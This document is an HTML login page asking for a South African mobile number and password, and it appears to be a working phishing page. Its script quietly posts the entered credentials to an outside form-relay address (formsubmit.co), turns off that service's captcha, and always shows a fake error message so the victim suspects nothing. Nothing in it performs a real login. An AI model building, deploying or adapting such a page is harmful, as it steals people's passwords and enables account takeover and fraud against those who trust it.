<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Login Page</title>
  <!-- Link your external CSS here -->
  <link rel="stylesheet" href="sebono.css" />
</head>
<body>

  <!-- Your HTML content here -->
  <div id="form-page">
    <h2>Login</h2>
    <form id="login-form">
      <input type="hidden" name="_captcha" value="false" />

      <label for="mobile">Mobile Number</label><br />
      <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required /><br />

      <label for="password">Password</label><br />
      <input type="password" id="password" name="password" placeholder="Password" required /><br />

      <button type="submit">Login</button>
    </form>
  </div>

  <div id="error-page" style="display:none;">
    <h2>An error has been detected, please try again later.</h2>
  </div>

  <script>
    const form = document.getElementById('login-form');
    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const formData = new FormData(form);

      try {
        await fetch("https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21", {
          method: "POST",
          body: formData
        });

        document.getElementById('form-page').style.display = 'none';
        document.getElementById('error-page').style.display = 'block';

      } catch (err) {
        document.getElementById('form-page').style.display = 'none';
        document.getElementById('error-page').style.display = 'block';
      }
    });
  </script>

</body>
</html>
